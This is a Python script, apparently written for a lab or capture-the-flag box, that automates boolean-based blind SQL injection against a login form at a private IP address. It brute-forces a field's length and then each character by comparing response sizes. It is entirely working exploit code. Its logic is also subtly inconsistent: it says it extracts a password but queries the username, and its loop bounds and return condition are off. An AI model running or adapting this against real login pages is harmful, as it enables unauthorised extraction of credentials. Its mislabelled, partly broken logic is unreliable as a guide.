#!/usr/bin/env python3

from urllib import request

url = "http://10.10.10.25:8000/login"
headers = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0"}
ptbl = """0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!$._-"""

def getPasswLength():
    count = 0
    while True:
        sql = f'admin"+OR+length(username)%3d{count}+AND+"1"%3d"1'
        data =f"username={sql}&password=password"
        req = request.Request(url, data=data.encode(), headers=headers)
        resp = request.urlopen(req)
        if len(resp.read().decode()) != 1197:
            return count
        count += 1
        
        

def getPasswString(l):
    global passw
    passw = []
    for i in range(1,l):
        for c in ptbl:
            sql = f'admin"+OR+substr(username,{i},1)%3d"{c}'
            data = f"username={sql}&password=password"
            req = request.Request(url, data=data.encode(), headers=headers)
            resp = request.urlopen(req)
            if len(resp.read().decode()) != 1197:
                passw.append(c)
                print("Password: {}".format(''.join(passw)), end="\r")
            elif len(passw) == l:
                print("")
                return passw

print(getPasswString(getPasswLength()))
